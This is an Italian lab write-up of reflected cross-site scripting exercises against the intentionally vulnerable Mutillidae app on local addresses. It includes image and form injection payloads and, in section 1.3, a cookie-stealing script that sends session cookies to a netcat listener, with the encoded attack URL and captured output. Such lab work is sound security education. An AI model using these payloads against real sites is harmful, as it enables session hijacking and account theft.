# Esercizio 1 – Analisi di vulnerabilità XSS Riflesso

In questo esercizio viene analizzata una vulnerabilità di tipo Cross Site Scripting (XSS) riflesso, accessibile all'indirizzo:

`http://127.0.0.1/mutillidae/index.php?page=user-info.php`

Riferimento: A3 - Cross Site Scripting (XSS) → Reflected (First Order) → User Info

L'obiettivo è valutare se la pagina è vulnerabile a iniezione di codice lato client tramite l'input utente, e successivamente testare diverse tecniche di iniezione.

---

## 1.1 – Iniezione di un'immagine

Tramite l'input `username`, è possibile iniettare codice HTML. Ad esempio, il seguente payload permette di visualizzare un'immagine arbitraria nella pagina:

```html
"><img src="https://i.kym-cdn.com/photos/images/newsfeed/003/034/402/a4e.png">
```

La richiesta HTTP associata è la seguente:

```
http://192.168.64.21/mutillidae/index.php?page=user-info.php
&username=%22%3E%3Cimg+src%3D%22https%3A%2F%2Fi.kym-cdn.com%2Fphotos%2Fimages%2Fnewsfeed%2F003%2F034%2F402%2Fa4e.png%22%3E
&password=
&user-info-php-submit-button=View+Account+Details
```

---

## 1.2 – Iniezione di un form HTML

In questo esercizio si verifica la possibilità di iniettare un form HTML personalizzato tramite l'input dell'utente.

Il codice da iniettare è il seguente:

```html
"><form action="https://www.google.com/search" method="get">
    <input type="text" name="q" />
    <input type="submit" value="Cerca" />
</form>
```

Questo payload genera un form di ricerca che invia la query direttamente a Google.

---

## 1.3 – Esfiltrazione di cookie di sessione (cookie stealing)

L’obiettivo è realizzare uno script JavaScript che invii i cookie dell’utente autenticato a un server remoto controllato dall’attaccante.

### Configurazione lato server (attaccante)

Avviare un listener Netcat sulla porta 8080:

```bash
nc -l 8080
```

Nota: su macOS, il flag `-p` non è necessario né supportato in combinazione con `-l`.

### Payload JavaScript da iniettare

```html
<script>
    var x = new XMLHttpRequest();
    x.open("POST", "http://192.168.64.1:8080", true);
    x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    x.send("cookie=" + document.cookie);
</script>
```

### Versione URL-encoded per iniezione tramite URL:

```
http://192.168.64.21/mutillidae/index.php?page=user-info.php&username=%3E%3Cscript%3E+++++var+x+%3D+new+XMLHttpRequest%28%29%3B+++++x.open%28%22POST%22%2C+%22http%3A%2F%2F192.168.64.1%3A8080%22%2C+true%29%3B+++++x.setRequestHeader%28%22Content-Type%22%2C+%22application%2Fx-www-form-urlencoded%22%29%3B+++++x.send%28%22cookie%3D%22+%2B+document.cookie%29%3B+%3C%2Fscript%3E&password=&user-info-php-submit-button=View+Account+Details
```

---

### Funzionamento dello script

- Viene creato un oggetto `XMLHttpRequest`.
- Si apre una connessione HTTP POST verso il server remoto.
- Si imposta l’header `Content-Type` su `application/x-www-form-urlencoded`.
- Viene inviato il contenuto dei cookie dell’utente autenticato al server di ascolto.

### Esempio di output ricevuto su Netcat

```http
POST / HTTP/1.1
Host: 192.168.64.1:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X ...)
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.64.21/
Origin: http://192.168.64.21
Content-Length: 56

cookie=showhints=1; PHPSESSID=9f5qu5n2ldvo56b369qk55p641
```

---

**Nota**: affinché l'esfiltrazione avvenga correttamente, l'utente vittima deve essere autenticato e deve accedere al link malevolo generato con lo script iniettato.
